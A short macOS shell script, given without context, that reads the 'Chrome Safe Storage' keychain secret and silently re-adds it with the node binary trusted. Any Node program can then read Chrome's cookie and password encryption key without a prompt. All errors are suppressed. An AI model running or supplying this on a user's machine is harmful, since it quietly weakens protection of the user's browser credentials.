if ! /usr/bin/security find-generic-password -s "Chrome Safe Storage" >/dev/null 2>&1; then
  exit 0
fi

node_bin="$(command -v node || true)"
if [ -z "$node_bin" ]; then
  exit 0
fi

acct="$(
  /usr/bin/security find-generic-password -s "Chrome Safe Storage" 2>/dev/null \
    | /usr/bin/sed -n 's/.*"acct"<blob>="\\(.*\\)".*/\\1/p' \
    | /usr/bin/head -n 1
)"
if [ -z "$acct" ]; then
  exit 0
fi

secret="$(
  /usr/bin/security find-generic-password -s "Chrome Safe Storage" -a "$acct" -w 2>/dev/null || true
)"
if [ -z "$secret" ]; then
  exit 0
fi

/usr/bin/security add-generic-password -U \
  -s "Chrome Safe Storage" \
  -a "$acct" \
  -w "$secret" \
  -T "$node_bin" >/dev/null 2>&1 || true
